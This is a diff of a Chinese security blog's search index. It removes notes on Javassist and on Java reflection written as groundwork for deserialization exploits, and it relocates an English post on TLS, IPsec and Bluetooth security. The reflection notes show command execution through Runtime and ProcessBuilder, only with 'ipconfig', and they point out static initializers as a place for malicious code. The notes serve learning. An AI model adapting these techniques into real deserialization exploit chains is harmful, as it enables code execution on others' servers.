-
-        /*添加constructor*/
-        CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;,test);//给Test Class创建一个无参constructor
-        ctConstructor.setBody(&quot;&#123;name=\&quot;Jack\&quot;;&#125;&quot;);
-        test.addConstructor(ctConstructor);
-        //有参构造函数
-        CtConstructor ctConstructor1 = new CtConstructor(new CtClass[]&#123;cp.get(&quot;java.lang.String&quot;)&#125;,test);
-        ctConstructor1.setBody(&quot;&#123;$0.name=$1;&#125;&quot;);//this.name = name(第一个parameter)
-        test.addConstructor(ctConstructor1);
-
-        /*添加method*/
-        CtMethod printName = new CtMethod(CtClass.voidType,&quot;printName&quot;,new CtClass[]&#123;&#125;,test);
-        printName.setModifiers(Modifier.PUBLIC);
-        printName.setBody(&quot;&#123;System.out.println($0.name);&#125;&quot;);
-        printName.insertBefore(&quot;System.out.println(\&quot;before:\&quot;);&quot;);//在方法体前面加入（注意必须有了方法体才能插入）
-        printName.insertAfter(&quot;System.out.println(\&quot;after:\&quot;);&quot;);//在方法体后面加入
-        test.addMethod(printName);
-
-        /*写出Class到本地*/
-        test.writeFile();
-        test.detach();
-
-    &#125;
-&#125;
-</code></pre>
-<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/image-20211124203629163.png" alt="image-20211124203629163"></p>
-<h1 id="一些特殊参数"><a href="#一些特殊参数" class="headerlink" title="一些特殊参数"></a>一些特殊参数</h1><table>
-<thead>
-<tr>
-<th>标识符</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0、1、$2、 3 、 3、 3、…</td>
-<td>this和方法参数（1-N是方法参数的顺序，如第一个parameter）</td>
-</tr>
-<tr>
-<td>$args</td>
-<td>方法参数数组，类型为Object[]</td>
-</tr>
-<tr>
-<td>$$</td>
-<td>所有方法参数，例如：m($$)相当于m(1,1,2,…)</td>
-</tr>
-<tr>
-<td>$cflow(…)</td>
-<td>control flow 变量</td>
-</tr>
-<tr>
-<td>$r</td>
-<td>返回结果的类型，在强制转换表达式中使用。</td>
-</tr>
-<tr>
-<td>$w</td>
-<td>包装器类型，在强制转换表达式中使用。</td>
-</tr>
-<tr>
-<td>$_</td>
-<td>返回的结果值</td>
-</tr>
-<tr>
-<td>$sig</td>
-<td>类型为java.lang.Class的参数类型对象数组</td>
-</tr>
-<tr>
-<td>$type</td>
-<td>类型为java.lang.Class的返回值类型</td>
-</tr>
-<tr>
-<td>$class</td>
-<td>类型为java.lang.Class的正在修改的类</td>
-</tr>
-</tbody></table>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://juejin.cn/post/6952765170544279566#heading-13">Java字节码编程之非常好用的javassist</a></p>
-]]></content>
-      <categories>
-        <category>Web Security</category>
-        <category>JAVA反序列化漏洞</category>
-      </categories>
-      <tags>
-        <tag>Web Security</tag>
-        <tag>Java反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java反序列化漏洞之Java反射机制(1)</title>
-    <url>/2021/07/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是正式开始学习Java反序列化漏洞的第一篇，而Java反射机制是熟知Java反序列化漏洞的第一步，此系列笔记是为了自己能更好理解反序列化漏洞，也希望通过学习，自己能深层了解漏洞成因、学会利用、自己编写、改编利用工具。</p>
-<h1 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h1><h2 id="什么是Java反射机制"><a href="#什么是Java反射机制" class="headerlink" title="什么是Java反射机制"></a>什么是Java反射机制</h2><blockquote>
-<p>Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。反射被视为动态语言的关键。</p>
-</blockquote>
-<p>通俗的来说，就是我们可以通过Java的反射机制来获取到任意一个Class、变量、method、instance等等，而我们<strong>动态</strong>地任意获取Class，正有利于我们实现反序列化漏洞的利用。</p>
-<h2 id="静态语言和动态特性"><a href="#静态语言和动态特性" class="headerlink" title="静态语言和动态特性"></a>静态语言和动态特性</h2><p>简单来说，动态语言可以改变一个变量的类型 - 你不用提前定义某个变量的类型，比如<code>Python</code>和<code>PHP</code>,这些语言会在运行时自动探针你的变量类型，而你也可以在代码中随时对这些变量类型进行改变。</p>
-<p>而静态语言例如<code>Java</code>,<code>C/C++</code>,<code>C#</code>就不一样，我们必须事先指定变量类型是<code>String</code>,<code>int</code>,还是<code>double</code>？</p>
-<p>而在<code>Java</code>中，有一个<strong>反射机制</strong>，它可以为我们提供一些动态特性 - 即使<code>Java</code>是一门静态语言。</p>
-<p>Java的反射机制可以让我们做到如下：</p>
-<ul>
-<li>在程序运行时，查找到一个<code>Object</code>所属的<code>Class</code></li>
-<li>在程序运行时，能找到任意一个Class的<code>variable</code>和<code>method</code></li>
-<li>在程序运行时，可以构造任意一个<code>Class</code>的<code>instance(Object)</code></li>
-<li>在程序运行时，可以调用任何一个<code>Object</code>的方法</li>
-</ul>
-<span id="more"></span>
-
-<h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>先来看一张图：</p>
-<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/image-20211126201028486.png" alt="image-20211126201028486"></p>
-<p><strong>Class类</strong>： 保存类信息的类</p>
-<p>每一个新的class在创建的时候，都会new一个新的Class类。</p>
-<p>比如，我们在创建一个String类，这个String类在创建的同时，会有一个Class cls=new Class(String)被创建，专门用来保存这个String Class。</p>
-<p>再举个例子，比如我们在创建一个Person类，这个Person类在创建的时候，会有一个Class cls = new Class(Person)这样的instance被创建。<strong>但Class类和这两个类并非继承关系！！</strong></p>
-<p>所以，我们需要区分的是Class类是一个类，就像Person和String类一样，都是<strong>类</strong>，Person和String类在生成的时候，都会先生成Class类的instance（对象）。</p>
-<p>在Class类中，我们含有各种方法函数，其中Class类的构造方法是private，Class类还拥有<code>getMethod,invoke</code>这样的方法。</p>
-<p><strong>从图中可以看出：我们可以通过一个【person instance】.getClass()获取到person的Class类对象</strong></p>
-<p><strong>通过【person的Class类对象】.class获取到person instance.</strong></p>
-<h2 id="利用反射机制获取Class及Class静态初始化"><a href="#利用反射机制获取Class及Class静态初始化" class="headerlink" title="利用反射机制获取Class及Class静态初始化"></a>利用反射机制获取Class及Class静态初始化</h2><p>我们知道有三种方法可以获取到一个Class对象</p>
-<ul>
-<li><p><code>obj.getClass();</code></p>
-<ul>
-<li>当我们知道<strong>obj instance对象</strong>时可以使用这个方法</li>
-</ul>
-</li>
-<li><p><code>Class.forName(&quot;Class的名字&quot;);</code></p>
-</li>
-<li><p><code>Class.forName( String className , Boolean initialize , ClassLoader loader );</code></p>
-<ul>
-<li><p>此处<code>Class.forName(&quot;Class的名字&quot;);</code>等同于<code>Class.forName( &quot;Class的名字&quot; , true , currentLoader );</code></p>
-<blockquote>
-<ul>
-<li><code>String className</code> : 类名</li>
-<li><code>Boolean initialize</code> : 是否进行类初始化</li>
-<li><code>ClassLoader loader</code> : 加载器( 告诉 Java 虚拟机如何加载获取的类 , Java 默认根据类名( 即类的绝对路径 , 例如 <code>java.lang.Runtime()</code> )来加载类 )</li>
-</ul>
-</blockquote>
-</li>
-<li><p><code>Class</code>在<strong>初始化</strong>的时候，会自动执行<code>static&#123;&#125;</code>中的代码，如果我们能够控制一个<code>Class</code>，并向其中添加含有恶意代码的<strong>静态代码块</strong>，当<code>Class</code>被初始化的时候就会执行恶意代码。</p>
-</li>
-<li><p>当我们知道<strong>Class名字</strong>时可以使用这个方法</p>
-</li>
-</ul>
-</li>
-<li><p><code>className.class</code></p>
-<ul>
-<li>当我们已经<strong>加载过</strong>某个Class，可以用这个方法</li>
-</ul>
-</li>
-</ul>
-<p>其中，<code>Class.forName(&quot;Class的名字&quot;);</code>是最为常用的一种方式。</p>
-<pre><code class="java">Class&lt;?&gt; person = Class.forName(&quot;Person&quot;);
-
-System.out.println(person);
-</code></pre>
-<h2 id="利用反射机制获取method"><a href="#利用反射机制获取method" class="headerlink" title="利用反射机制获取method"></a>利用反射机制获取method</h2><p>我们在通过上面的代码获取到<code>class</code>后，可以获取到该<code>Class</code>的<code>method</code>。</p>
-<p>需要注意的是，我们依然有两种不同的方法来获取到<code>method</code>。</p>
-<pre><code class="java">//第一种方式：
-person.getDeclaredMethods();//获取所有Method，除了继承类的方法
-person.getDeclaredMethod(&quot;methodName&quot;,parameterTypes);//获取指定的method
-//第二种方式：
-person.getMethods();//获取类方法，但不包含private属性的方法
-person.getMethod(&quot;methodName&quot;,parameterTypes);//获取指定名字的方法
-</code></pre>
-<h2 id="构造instance"><a href="#构造instance" class="headerlink" title="构造instance"></a>构造instance</h2><p> 获取到了<code>Class</code>,我们又该如何获取到一个新的object呢？</p>
-<p>假设在Person Class中，我们有三个构造函数：</p>
-<pre><code class="java">public Person()&#123;//无参构造
-    System.out.println(&quot;NoArgConstructor&quot;);
-&#125;
-public Person(String name,String age)&#123;//两个参数构造
-    System.out.println(&quot;TwoArgsConstructor&quot;);
-&#125;
-public Person(String name,String age,boolean flag)&#123;
-    //三个参数构造
-    System.out.println(&quot;ThreeArgsConstructor&quot;);
-&#125;
-</code></pre>
-<p>当我们依次获取时</p>
-<pre><code class="java">person.newInstance();//在创建新的instance时，class的constructor会被执行，而此处默认执行无参数constructor
-       person.getConstructor(String.class,String.class).newInstance(&quot;leihehe&quot;,&quot;21&quot;);//此处执行两个参数的constructor
-       person.getConstructor(String.class,String.class,boolean.class).newInstance(&quot;leiheee&quot;,&quot;20&quot;,true);//此处执行三个参数的constructor
-</code></pre>
-<p>可得如下结果</p>
-<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721212917832.png" alt="image-20210721212917832"></p>
-<h2 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h2><p>当我们构造出来了一个新的<code>instance（Object）</code>且得到需要的<code>method</code>后，我们该如何<code>call</code>这个<code>Class</code>的方法呢？</p>
-<pre><code class="java">Object o = person.newInstance();//得到object
-person.getDeclaredMethod(&quot;setAge&quot;, String.class).invoke(o,&quot;11&quot;);//call setAge()方法
-</code></pre>
-<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="java-lang-Runtime命令执行及访问private的方法"><a href="#java-lang-Runtime命令执行及访问private的方法" class="headerlink" title="java.lang.Runtime命令执行及访问private的方法"></a>java.lang.Runtime命令执行及访问private的方法</h2><p>我们在反序列化漏洞中会遇到的<code>java.lang.Runtime</code>是执行命令的最常见的方式。</p>
-<p>以下是java执行命令的语句</p>
-<pre><code class="java">Runtime.getRuntime().exec(&quot;ipconfig&quot;);
-</code></pre>
-<p>那如果我们要用<code>java</code>的反射机制来执行这段代码应该如何操作呢？</p>
-<p>于是我写下了这段代码：</p>
-<pre><code class="java">Class&lt;?&gt; runTimeClass = Class.forName(&quot;java.lang.Runtime&quot;);//先找到Runtime这个Class的Class类
-Method exec = runTimeClass.getDeclaredMethod(&quot;exec&quot;, String.class);//找到exec这个method
-Object o1 = runTimeClass.newInstance();//创建一个新的Runtime的实例
-exec.invoke(o1,&quot;ipconfig&quot;);//在实例中call exec()这个method
-</code></pre>
-<p>但是奇怪的事情发生了：</p>
-<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721214436241.png" alt="image-20210721214436241"></p>
-<p>代码提示19行出错 - 我们不能访问<code>private</code>属性的成员。难道是<code>constructor</code>有问题吗？</p>
-<p>我们尝试进入<code>Runtime Class</code>中看一下：</p>
-<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721214751377.png" alt="image-20210721214751377"> 果然，该构造方法是<code>private</code>的，加上前面所提到的，<code>className.newInstance()</code>是直接使用无参构造，所以我们不能直接创建这个<code>instance</code>。 </p>
-<p>如何解决呢？我们有两个方法</p>
-<ol>
-<li><p><strong>getRuntime()</strong></p>
-<p>其实之前我们就有写到执行语句是<code>Runtime.getRuntime().exec(&quot;ipconfig&quot;);</code>此处我们就没有new一个新的<code>instance</code>，反而是直接用<code>getter</code>来获取到<code>Runtime</code>。</p>
-<p>所以我们在此处可以这样写：</p>
-<pre><code class="java">Class&lt;?&gt; runTimeClass = Class.forName(&quot;java.lang.Runtime&quot;);//先找到Runtime这个Class
-Method exec = runTimeClass.getDeclaredMethod(&quot;exec&quot;, String.class);//找到exec这个method
-Method getRuntime = runTimeClass.getDeclaredMethod(&quot;getRuntime&quot;);//找到getRuntime()这个method
-Object o1=getRuntime.invoke(null);//call getRuntime()来获取到Runtime实例
-exec.invoke(o1,&quot;ipconfig&quot;);//执行方法
-</code></pre>
-</li>
-<li><p><strong>setAccessible() - 访问private方法</strong> </p>
-<p><code>Java</code>会对<code>private</code>的方法进行禁止访问的操作，而<code>setAccessible</code>可以让我们禁止或允许<code>Java</code>语言的访问检查，当我们设置<code>setAccessible(true)</code>时，我们便可以访问<code>private</code>方法。</p>
-<pre><code class="java">Class&lt;?&gt; runTimeClass = Class.forName(&quot;java.lang.Runtime&quot;);//先找到Runtime这个Class
-Method exec = runTimeClass.getDeclaredMethod(&quot;exec&quot;, String.class);//找到exec这个method
-Constructor&lt;?&gt; declaredConstructor = runTimeClass.getDeclaredConstructor();//不带参数的getConstructor是会获取到无参构造方法的，但因为Runtime的Constructor是private的，所以我们需要使用Declared
-declaredConstructor.setAccessible(true);//禁止java语言访问检查，让我们可以访问这个私有的constructor
-Object o1 = declaredConstructor.newInstance();//通过该constructor来创建新的instance
-exec.invoke(o1,&quot;ipconfig&quot;);//完成命令执行
-</code></pre>
-</li>
-</ol>
-<h2 id="java-lang-ProcessBuilder命令执行"><a href="#java-lang-ProcessBuilder命令执行" class="headerlink" title="java.lang.ProcessBuilder命令执行"></a>java.lang.ProcessBuilder命令执行</h2><p>知道我们是通过<code>exec()</code>执行代码后，我们接下来想要弄清楚，<code>exec()</code>是怎么工作的。在尝试跟随exec()方法后，我们最终来到了如下地方：</p>
-<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721221330679.png" alt="image-20210721221330679"></p>
-<p>可见我们创建了一个<code>ProcessBuilder</code>的<code>instance</code>，同时向其中传入了我们需要执行的命令<code>cmdArray</code>，<code>cmdArray</code>也是以<code>String[]</code>的类型传入的。</p>
-<p>进入<code>Processbuilder</code>可以看到它有两个<code>constructor</code>，一个是传入有参数的(<code>List&lt;String&gt;类型</code>)，一个是传入无参数的(<code>String[]类型</code>),注意,这里<code>String...</code>等价于<code>String[]</code></p>
-<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721222648669.png" alt="image-20210721222648669"></p>
-<p>再看<code>start()</code>方法</p>
-<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721221932382.png" alt="image-20210721221932382"></p>
-<p>传入的<code>command</code>又会被转化为<code>Array</code>，最后开始创建子程序执行等等（就不深入探究了）</p>
-<p>综上所述，我们只需要执行<code>new ProcessBuilder.start()</code>即可完成命令执行</p>
-<p>于是我们写出如下代码：</p>
-<pre><code class="java">        Class&lt;?&gt; processBuilderClass = Class.forName(&quot;java.lang.ProcessBuilder&quot;);//获取到ProcessBuilder这个class
-        Method start = processBuilderClass.getDeclaredMethod(&quot;start&quot;);//获取到start()这个方法
-        //因为两个constructor都是public的，所以我们可以只用用getConstructor而不用getDeclaredConstructor
-        Object oWithArg = processBuilderClass.getConstructor(List.class).newInstance(Arrays.asList(&quot;ipconfig&quot;,&quot;/all&quot;));//获取带参数的命令的instance
-        Object oNoArg = processBuilderClass.getConstructor(String[].class).newInstance((Object) new String[]&#123;&quot;ipconfig&quot;&#125;);//获取不带参数的命令的instance
-        Process argStart=(Process) start.invoke(oWithArg);
-        Process noArgStart=(Process) start.invoke(oNoArg);
-        InputStream argIn = argStart.getInputStream();//获取Process的输出流来作为输入字节流
-        InputStream noArgIn = noArgStart.getInputStream();//获取Process的输出流来作为输入字节流
-        InputStreamReader argReader=new InputStreamReader(argIn);//把字节流转化为字符流
-        InputStreamReader noArgReader=new InputStreamReader(noArgIn);//把字节流转化为字符流
-        BufferedReader argBr=new BufferedReader(argReader);//为字符流提供缓冲区，以便一次性读取整块数据
-        BufferedReader noArgBr=new BufferedReader(noArgReader);//为字符流提供缓冲区，以便一次性读取整块数据
-
-        String line=null;
-        while((line=argBr.readLine())!=null)&#123;//一行行读取
-            System.out.println(line);
-        &#125;
-
-        while((line=noArgBr.readLine())!=null)&#123;//一行行读取
-            System.out.println(line);
-        &#125;
-</code></pre>
-<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721232833104.png" alt="image-20210721232833104"></p>
-<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><ul>
-<li><p>Java反射机制是Java这个静态语言中的动态特性，它让我们能够获取到、执行任意类的方法、变量，也能创建任意类的对象。</p>
-</li>
-<li><p><code>Class</code>被初始化时会自动执行<code>static&#123;&#125;</code>中的内容，此处可以被利用。</p>
-</li>
-<li><p><code>Declared</code>关键字让我们可以获取处继承类以外的所有方法。</p>
-</li>
-<li><p><code>setAccessible(true)</code>可以访问private方法，不被<code>java</code>语言进行访问检测。</p>
-</li>
-<li><p>我们可以通过Java反射机制利用Runtime和ProcessBuilder执行命令</p>
-</li>
-</ul>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.guildhab.top/2020/04/java-rmi-%e5%88%a9%e7%94%a82-java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">Epicccal - Java 反序列化漏洞(2) – Java 反射机制</a></p>
 ]]></content>
       <categories>
         <category>Web Security</category>
@@ -4959,6 +4959,103 @@ sed -ri &#39;s/.*swap.*/#&amp;/&#39; /etc/fstab
         <tag>Web Security</tag>
         <tag>SQL Injection</tag>
         <tag>SQLilab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Security Protocols</title>
+    <url>/2022/06/12/Security-Protocols/</url>
+    <content><![CDATA[<h1 id="SSL-TLS-Protocol"><a href="#SSL-TLS-Protocol" class="headerlink" title="SSL/TLS Protocol"></a>SSL/TLS Protocol</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>SSL</code> stands for <strong>Secure Sockets Layer</strong>, and TLS stands for <strong>Transport Layer Security</strong>. TLS is an updated and more secure version of SSL. Nowadays, the SSL has been deprecated and replaced with TLS, therefore, we will use the term “TLS” to explain this protocol.</p>
+<span id="more"></span>
+
+<p>SSL/TLS protocol is used to achieve the following goals</p>
+<ul>
+<li>CONFidentiality</li>
+<li>INTegrity</li>
+<li>AUTHentication</li>
+</ul>
+<p>A very common use is <strong>HTTPS</strong>. <strong>HTTPS</strong> is the HTTP protocol with data encryption using SSL/TLS.</p>
+<h2 id="TLS-Handshake-Explanation"><a href="#TLS-Handshake-Explanation" class="headerlink" title="TLS Handshake Explanation"></a>TLS Handshake Explanation</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612155851.png" alt="TLS handshake"></p>
+<ol>
+<li><p>Client sends hello, supported TLS version, supported cipher suite and Random(client random string).</p>
+</li>
+<li><p>Server sends message “server hello” back to the client, and also responds with chosen cipher suite, server random string, and SSL certificate(with server’s public key).</p>
+</li>
+<li><p>The client will verify the SSL certificate information, get the public key of the server.</p>
+</li>
+<li><p>Client sends pre-master key generated using the public key he just got from the server.</p>
+</li>
+<li><p>Server decrypts the pre-master key from the client by using his private key.</p>
+</li>
+<li><p>Both client and server use “client random”, “server random” and pre-master key to generate the same shared key using the same algorithm</p>
+</li>
+<li><p>Client is ready: client sends “finished” message which is encrypted by the shared key.</p>
+</li>
+<li><p>Server is ready: server sends “finished” message which is encrypted by the shared key.</p>
+</li>
+<li><p>Handshake is finished, server and client use symmetric crypto to communicate with each other.</p>
+</li>
+</ol>
+<h2 id="How-SSL-TLS-protocol-prevent-attack"><a href="#How-SSL-TLS-protocol-prevent-attack" class="headerlink" title="How SSL/TLS protocol prevent attack"></a>How SSL/TLS protocol prevent attack</h2><h3 id="Scenario-1"><a href="#Scenario-1" class="headerlink" title="Scenario 1"></a>Scenario 1</h3><p>Attacker intercpet the message sending from the client to the server, direct it to themselves, and the attacker itself will send hello message to the client. Server will send its certificate to attacker and attacker will send this back to the client. </p>
+<p><strong>Solution</strong></p>
+<p>Eventhough the client verified the certificate, the attcker has no idea what the private key of the server, so he cannot decrypt the key transport and also cannot get the shared key generated later.</p>
+<h3 id="Scenario-2"><a href="#Scenario-2" class="headerlink" title="Scenario 2"></a>Scenario 2</h3><p>Attacker sends client a fake certificate for google.com, will client uses the fake public key to generate a symmetric key?</p>
+<p><strong>Solution</strong></p>
+<p>After receiving the fake certificate, client would look up from the online public database for the public key of the certificate received to verify the certificate. Obviously, the certificate is fake and the website will then be labelled as not secure and the attack failed.</p>
+<h2 id="Common-Attacks"><a href="#Common-Attacks" class="headerlink" title="Common Attacks"></a>Common Attacks</h2><h3 id="SSL-Stripping-Attack"><a href="#SSL-Stripping-Attack" class="headerlink" title="SSL Stripping Attack"></a>SSL Stripping Attack</h3><p>Attacker modifies web traffic to trick a client into accepting http connection instead of https </p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612172551.png" alt="SSL stripping attack"></p>
+<p><strong>Countermeasure</strong></p>
+<p>Server tells browser upon first visit to only accept HTTPS(not HTTP) for future requests to this domain.</p>
+<h3 id="BEASAT-POODLE"><a href="#BEASAT-POODLE" class="headerlink" title="BEASAT/POODLE"></a>BEASAT/POODLE</h3><p>Browser Exploit Against SSL/TLS / Padding Oracle On Downgraded Legacy</p>
+<ul>
+<li>Attacker exploits Bugs in encryption/MAC mode of operation algorithm in TLS 1.0 to extract information on secret key.</li>
+</ul>
+<p><strong>Countermeasure</strong></p>
+<p>Patches to TLS algorithms/implementations.</p>
+<h3 id="Compression-ratio-info-leak-Made-Easy-CRIME"><a href="#Compression-ratio-info-leak-Made-Easy-CRIME" class="headerlink" title="Compression ratio info-leak Made Easy(CRIME)"></a>Compression ratio info-leak Made Easy(CRIME)</h3><p>TLS has a compress-then-encrypt mode; Compressed data length no hidden by encryption, reveals information to attacker on secret web site cookies. </p>
+<p><strong>Countermeasure</strong></p>
+<p>Disable TLS compression, avoid if possible record layer compression.</p>
+<h1 id="IPsec-Protocol"><a href="#IPsec-Protocol" class="headerlink" title="IPsec Protocol"></a>IPsec Protocol</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>IPsec</code> stands for <strong>Internet Protocol Security</strong>, and is common used by VPN(<strong>Virtual Private Network</strong>).</p>
+<h2 id="IPsec-methods"><a href="#IPsec-methods" class="headerlink" title="IPsec methods"></a>IPsec methods</h2><h3 id="AH-Authentication-Header"><a href="#AH-Authentication-Header" class="headerlink" title="AH - Authentication Header"></a>AH - Authentication Header</h3><p>AH can only authenticate data, and it cannot encrypt data. It adds an Authentication after the <strong>original IP header</strong>. AH authenticate the whole IP packet.</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612204412.png" alt="authentication header"></p>
+<p><strong>Security parameters index</strong>: point to entry corresponding to browser/server; includes info on shared key.</p>
+<p><strong>Sequence Number</strong> is used for freshness vs replay attacks</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612204929.png" alt="AH example"></p>
+<h3 id="ESP-Encapsulating-Security-Payload"><a href="#ESP-Encapsulating-Security-Payload" class="headerlink" title="ESP - Encapsulating Security Payload"></a>ESP - Encapsulating Security Payload</h3><p><strong>ESP supports both Authentication and Encryption.</strong> However, ESP does not encrypt and authenticate the IP header.</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612205320.png" alt="ESP"></p>
+<h2 id="Modes"><a href="#Modes" class="headerlink" title="Modes"></a>Modes</h2><ul>
+<li><strong>Transport Mode</strong><ul>
+<li>IP packet inserted with IPsec header(AH header/ESP header)</li>
+</ul>
+</li>
+<li><strong>Tunnel Mode</strong><ul>
+<li><strong>original packet preserved</strong> incl original header, new header added/prepended(at the begining of the whole packet)</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612205922.png" alt="modes"></p>
+<h1 id="PAN"><a href="#PAN" class="headerlink" title="PAN"></a>PAN</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>PAN</code> stands for <strong>Personal Area Network</strong>. This technique is mainly used by Bluetooth. </p>
+<p><strong>Bluetooth’s Secure Connections</strong></p>
+<blockquote>
+<p>leverage on <strong>human channel</strong> during pairing, e.g.</p>
+<ul>
+<li><p>compare passkey on both devices</p>
+</li>
+<li><p>see passkey on one, type into the other</p>
+</li>
+<li><p>type same passkey into both</p>
+</li>
+<li><p>which option, depends on device I/O capability </p>
+</li>
+</ul>
+</blockquote>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Monash Uni FIT2093</p>
+<p><a href="https://blog.csdn.net/qq_38265137/article/details/89423551">https://blog.csdn.net/qq_38265137/article/details/89423551</a></p>
+]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>Web Security</tag>
       </tags>
   </entry>
   <entry>
@@ -8416,103 +8513,6 @@ org.apache.tomcat.dbcp.dbcp2.BasicDataSource//需要dbcp或者tomcat-dbcp的依�
       </tags>
   </entry>
   <entry>
-    <title>Security Protocols</title>
-    <url>/2022/06/12/Security-Protocols/</url>
-    <content><![CDATA[<h1 id="SSL-TLS-Protocol"><a href="#SSL-TLS-Protocol" class="headerlink" title="SSL/TLS Protocol"></a>SSL/TLS Protocol</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>SSL</code> stands for <strong>Secure Sockets Layer</strong>, and TLS stands for <strong>Transport Layer Security</strong>. TLS is an updated and more secure version of SSL. Nowadays, the SSL has been deprecated and replaced with TLS, therefore, we will use the term “TLS” to explain this protocol.</p>
-<span id="more"></span>
-
-<p>SSL/TLS protocol is used to achieve the following goals</p>
-<ul>
-<li>CONFidentiality</li>
-<li>INTegrity</li>
-<li>AUTHentication</li>
-</ul>
-<p>A very common use is <strong>HTTPS</strong>. <strong>HTTPS</strong> is the HTTP protocol with data encryption using SSL/TLS.</p>
-<h2 id="TLS-Handshake-Explanation"><a href="#TLS-Handshake-Explanation" class="headerlink" title="TLS Handshake Explanation"></a>TLS Handshake Explanation</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612155851.png" alt="TLS handshake"></p>
-<ol>
-<li><p>Client sends hello, supported TLS version, supported cipher suite and Random(client random string).</p>
-</li>
-<li><p>Server sends message “server hello” back to the client, and also responds with chosen cipher suite, server random string, and SSL certificate(with server’s public key).</p>
-</li>
-<li><p>The client will verify the SSL certificate information, get the public key of the server.</p>
-</li>
-<li><p>Client sends pre-master key generated using the public key he just got from the server.</p>
-</li>
-<li><p>Server decrypts the pre-master key from the client by using his private key.</p>
-</li>
-<li><p>Both client and server use “client random”, “server random” and pre-master key to generate the same shared key using the same algorithm</p>
-</li>
-<li><p>Client is ready: client sends “finished” message which is encrypted by the shared key.</p>
-</li>
-<li><p>Server is ready: server sends “finished” message which is encrypted by the shared key.</p>
-</li>
-<li><p>Handshake is finished, server and client use symmetric crypto to communicate with each other.</p>
-</li>
-</ol>
-<h2 id="How-SSL-TLS-protocol-prevent-attack"><a href="#How-SSL-TLS-protocol-prevent-attack" class="headerlink" title="How SSL/TLS protocol prevent attack"></a>How SSL/TLS protocol prevent attack</h2><h3 id="Scenario-1"><a href="#Scenario-1" class="headerlink" title="Scenario 1"></a>Scenario 1</h3><p>Attacker intercpet the message sending from the client to the server, direct it to themselves, and the attacker itself will send hello message to the client. Server will send its certificate to attacker and attacker will send this back to the client. </p>
-<p><strong>Solution</strong></p>
